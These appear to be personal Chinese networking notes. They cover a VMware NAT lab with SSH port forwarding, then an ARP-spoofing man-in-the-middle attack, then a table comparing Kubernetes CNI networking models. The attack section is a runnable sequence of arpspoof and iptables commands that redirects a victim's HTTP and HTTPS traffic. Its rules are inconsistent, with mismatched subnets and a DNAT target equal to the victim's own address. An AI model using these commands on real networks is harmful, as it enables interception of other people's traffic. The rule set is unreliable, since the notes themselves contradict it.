# 网络实验
## NAT
 ### 环境
  虚拟机镜像
	 ==Ubuntu 24.04.02==
 宿主机环境
	 ==Windows 11==
	 ==VMWare workstation 17.6.3==
	 ==Tabby 1.0.223==
### 实验步骤：
1. 先通过 VMWare安装 os
2. 网络模式选择 NAT
3. 安装后在 VMWare 中选择 编辑 -> 虚拟网络编辑器
4. 在虚拟网络编辑器中选择 更改设置 ，之后选择 NAT 所在的网卡接口
5. 配置子网范围
6. 选择 NAT 设置，配置网关 IP，端口转发等，比如配置转发虚拟机中的22端口
7. 用 Tabby 测试 ssh 连接，地址是 127.0.0.1 端口是刚刚配置的宿主机端口
### 实验总结
NAT 方式的**优点**：
更加安全，只有通过端口转发才能访问内部主机的资源。
NAT 方式的**缺点**：
端口转发会牺牲些性能，而且使过程复杂了些
# 网络攻击
## ARP欺骗
```sh
# 安装工具
sudo apt install dsniff

# 开启转发
sudo sysctl -w net.ipv4.ip_forward=1

# 将流量都发送到自己机器上
sudo arpspoof -i enp0s3 -t 192.168.0.100 192.168.0.1
sudo arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.100

# 规则 NAT 重定向
sudo iptables -t nat -A PREROUTING -i enp0s3 -s 192.168.0.100 -p tcp --dport 80 -j DNAT --to-destination 192.168.0.100:80

# 规则 允许 HTTP 转发
sudo iptables -A FORWARD -s 192.168.0.100 -d 192.168.0.100 -p tcp --dport 80 -j ACCEPT
sudo iptables -A FORWARD -d 192.168.0.100 -s 192.168.0.100 -p tcp --sport 80 -j ACCEPT
# 规则 重定向到 80
sudo iptables -t nat -A PREROUTING -s 192.168.1.100 -p tcp --dport 80 -j REDIRECT --to-port 80
sudo iptables -t nat -A PREROUTING -s 192.168.1.100 -p tcp --dport 443 -j REDIRECT --to-port 80


# 规则 阻断其它所有流量
sudo iptables -A FORWARD -s 192.168.0.100 -j DROP
sudo iptables -A FORWARD -d 192.168.0.100 -j DROP

```

| **特性**    | **VXLAN (Overlay)**          | **BGP (Underlay/Routing)** | **VPC Native (云原生直通)**         |
| --------- | ---------------------------- | -------------------------- | ------------------------------ |
| **本质**    | **隧道封装**：在 UDP 包里装以太网帧。      | **路由扩散**：把 Pod IP 宣告给交换机。  | **资源映射**：Pod 直接使用 VPC 的 IP/网卡。 |
| **性能损耗**  | **较高** (有封包开销 & MTU 限制)。     | **极低** (原生转发，无开销)。         | **无** (等同于云服务器原生性能)。           |
| **网络层级**  | 逻辑上的二层 (L2 over L3)。         | 纯三层 (L3)。                  | 扁平化，Pod 与 VM 在同一层。             |
| **配置复杂度** | **极低**：安装 CNI 即可用。           | **高**：需配置交换机或 BGP 邻居。      | **中**：需云厂商插件及权限配置。             |
| **故障排查**  | **难**：抓包看到的是封装后的 UDP。        | **易**：直观看到 Pod 间 IP 通信。    | **最易**：云平台控制台直接监控。             |
| **代表方案**  | Flannel VXLAN, Calico VXLAN。 | Calico BGP, Cilium BGP。    | 阿里云 Terway, AWS VPC CNI。       |
